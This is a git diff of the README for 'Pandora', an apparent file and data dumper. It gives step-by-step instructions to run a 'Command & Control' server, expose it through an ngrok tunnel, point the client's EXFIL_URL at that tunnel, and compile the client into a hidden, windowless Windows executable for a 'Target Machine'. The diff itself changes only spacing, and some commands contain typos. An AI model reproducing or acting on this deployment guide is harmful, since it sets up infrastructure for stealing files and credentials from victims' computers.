@@ -55,16 +55,19 @@ File and Data Dumper
 ​The server acts as the "Command & Control" (C2) center to receive incoming data packets.
 
 1.1. Install dependencies:
+
 ```text
 pip install flask tabulate colorama
 ```
 
 1.2. Start the server:
+
 ```text
 python server.py
 ```
 
 1.3. Make a Onefile exe-file:
+
 ```text
 python -m PyInstaller --oneflle --name "Pandora Server" server.py
 ```
@@ -75,26 +78,35 @@ The server runs on port 3000 by default.
 ​To allow the client to send data over the internet to your local machine:
 
 2.1. Download and install Nrog.
+
 2.2. Authenticate your account: ngrok config add-authtoken YOUR_TOKEN_HERE
+
 2.3. Start the tunnel:
+
 ```text
 ngrok http 3000
 ```
+
 2.4. Copy the Forwarding URL (e.g., https://random-id.ngrok-free.dev).
+
 2.5. Update Client: Open client.py and replace EXFIL_URL with your Ngrok URL (keep the /upload suffix).
 
 ## 3. Compiling the Client to EXE (Target Machine)
 ​To convert the client.py into a standalone Windows executable:
 
 3.1. Install Build Tools:
+
 ```text
 pip install pyinstaller pycryptodome pypiwin32 requests
 ```
+
 3.2. Generate EXE:
 Run the following command to create a single, hidden (windowless) file:
+
 ```text
 python -m PyInstaller --noconsole --onefile --icon=ICON.ico --name "Pandora Client" client.py
 ```
+
 3.3. Your executable will be located in the dist/ folder.
 
 ## 4. Decryption
